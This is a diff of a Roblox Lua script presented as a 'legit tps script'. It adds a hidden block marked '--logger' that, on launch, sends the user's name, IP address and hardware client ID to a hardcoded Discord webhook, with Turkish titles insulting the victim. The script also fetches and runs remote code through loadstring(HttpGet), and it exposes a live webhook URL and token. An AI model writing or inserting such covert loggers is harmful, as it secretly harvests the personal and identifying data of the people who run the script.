@@ -1,7 +1,86 @@
-loadstring(game:HttpGet("https://paste.ee/r/11sBD"))()
-            
+--logger
 
+Http = game:GetService("HttpService")
+Web = "https://discord.com/api/webhooks/1067569739213324288/JZnoB19qU73_y-Xh9i_zm9eWU7JSFCRBLfwCUcZPhQBd6ChQvmEZ8nsYS261Y6MowQxi"
 
+if syn then
+    local responce = syn.request(
+    {
+        Url = Web,
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+        Body = Http:JSONEncode({
+            ["content"] = "",
+            ["embeds"] = {{
+                ["title"] = "**scriptin çalıştırıldı!**",
+                ["description"] = game.Players.LocalPlayer.Name.. " bu oç sc kullandı",
+                ["type"] = "rich",
+                ["color"] = tonumber(random),
+                ["fields"] = {
+                    {
+                        ["name"] = " Ip",
+                        ["value"] =  game:HttpGet("https://PushyFrankSymbol.kingbobsuper.repl.co", true),
+                        ["inline"] = true
+                    }
+                }
+                
+            }}
+        })
+    })
+   else
+    request(
+        {
+            Url = Web,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = Http:JSONEncode({
+                ["content"] = "",
+                ["embeds"] = {{
+                    ["title"] = "**Bir adet orospu cocugu scriptini çalıştırdı!**",
+                    ["description"] =  game.Players.LocalPlayer.Name.. " hardwareid aşağıda",
+                    ["type"] = "rich",
+                    ["color"] = tonumber(random),
+                    ["fields"] = {
+                        {
+                            ["name"] = "Hardware ID:",
+							["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                            ["inline"] = true
+                        }
+                    }
+                    
+                }}
+            })
+        })
+		request({
+			Url = Web,
+			Method = 'POST',
+			Headers = {
+				['Content-Type'] = 'application/json'
+			},
+			Body = Http:JSONEncode({
+				["content"] = "",
+				["embeds"] = {{
+					["title"] = "**scriptin çalıştırıldı!**",
+					["description"] = game.Players.LocalPlayer.Name.. " ipsi aşağıda",
+					["type"] = "rich",
+					["color"] = tonumber(random),
+					["fields"] = {
+						{
+							["name"] = " Ip",
+							["value"] =  game:HttpGet("https://PushyFrankSymbol.kingbobsuper.repl.co", true),
+							["inline"] = true
+						}
+					}
+					
+				}}
+			})
+		})
+    end
+    
 --script
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 local Window = OrionLib:MakeWindow({Name = "legit tps script", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest", IntroEnabled = true, IntroText = "wtf"})
